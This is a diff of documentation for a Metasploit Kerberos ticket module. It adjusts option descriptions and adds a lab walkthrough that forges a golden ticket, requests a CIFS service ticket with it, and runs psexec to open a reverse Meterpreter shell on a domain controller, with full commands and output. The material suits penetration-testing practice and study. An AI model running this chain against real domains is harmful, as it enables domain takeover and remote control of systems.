@@ -56,18 +56,29 @@ The user's AES key to use for Kerberos authentication in hex string. Supported
 keys: 128 or 256 bits.
 
 ### SPN
-The Service Principal Name, the format is `service_name/FQDN` . Ex:
-cifs/dc01.mydomain.local. This option is only used when requesting a TGS.
+
+This option is only used when requesting a TGS.
+
+The Service Principal Name, the format is `service_name/FQDN`.
+Ex: cifs/dc01.mydomain.local.
 
 ### IMPERSONATE
 The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to
 request the ticket).
 
 ### KrbUseCachedCredentials
+
+This option is only used when requesting a TGS.
+
 If set to `true`, it looks for a matching TGT in the database and, if found,
-use it for Kerberos authentication when requesting a TGS. Note that this option
-only applies to `GET_TGS` action and has no effect on the `GET_TGT` action.
+use it for Kerberos authentication when requesting a TGS.
 Default is `true`.
+
+### Krb5Ccname
+
+This option is only used when requesting a TGS.
+
+The Kerberos TGT to use when requesting the sevice ticket. If unset, the database will be checked'
 
 ## Scenarios
 
@@ -282,4 +293,43 @@ host             service  type                 name  content                   i
 ----             -------  ----                 ----  -------                   ----                                                                             ----
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: krbtgt/mylab.local, username: servicea          /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_667626.bin
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_757041.bin
+```
+
+TGS using a previously forged golden ticket:
+
+```
+# Forge a golden ticket
+msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN aes_key=dac659cec15c80bb2bc8b26cdd3f29076cff84da7ab7ec6cf9dfc2cafa33e087 domain_sid=S-1-5-21-2771926996-166873999-4256077803 domain=dev.demo.local spn=krbtgt/DEV.DEMO.LOCAL user=Administrator
+
+[*] TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin
+[*] Auxiliary module execution completed
+
+
+# Request a silver ticket:
+
+msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhosts=10.10.11.5 Krb5Ccname=/Users/user/.msf4/loot/20230309120450_default_unknown_mit.kerberos.cca_940462.bin username=Administrator domain=dev.demo.local spn=cifs/dc02.dev.demo.local
+[*] Running module against 10.10.11.5
+
+[*] 10.10.11.5:88 - Using cached credential for krbtgt/DEV.DEMO.LOCAL@DEV.DEMO.LOCAL Administrator@DEV.DEMO.LOCAL
+[*] 10.10.11.5:88 - Getting TGS for Administrator@dev.demo.local (SPN: cifs/dc02.dev.demo.local)
+[+] 10.10.11.5:88 - Received a valid TGS-Response
+[*] 10.10.11.5:88 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin
+[+] 10.10.11.5:88 - Received a valid delegation TGS-Response
+[*] Auxiliary module execution completed
+
+# Use psexec:
+
+msf6 exploit(windows/smb/psexec) > run rhost=10.10.11.5 smbdomain=dev.demo.local username=Administrator smb::auth=kerberos smb::krb5ccname=/Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin smb::rhostname=dc02.dev.demo.local domaincontrollerrhost=10.10.11.5 lhost=192.168.123.1
+
+[*] Started reverse TCP handler on 192.168.123.1:4444
+[*] 10.10.11.5:445 - Connecting to the server...
+[*] 10.10.11.5:445 - Authenticating to 10.10.11.5:445|dev.demo.local as user 'Administrator'...
+[*] 10.10.11.5:445 - Loaded a credential from ticket file: /Users/user/.msf4/loot/20230309120802_default_10.10.11.5_mit.kerberos.cca_352530.bin
+[*] 10.10.11.5:445 - Selecting PowerShell target
+[*] 10.10.11.5:445 - Executing the payload...
+[+] 10.10.11.5:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175686 bytes) to 10.10.11.5
+
+[*] Meterpreter session 1 opened (192.168.123.1:4444 -> 10.10.11.5:60625) at 2023-03-09 12:08:49 +0000
+meterpreter >
 ```
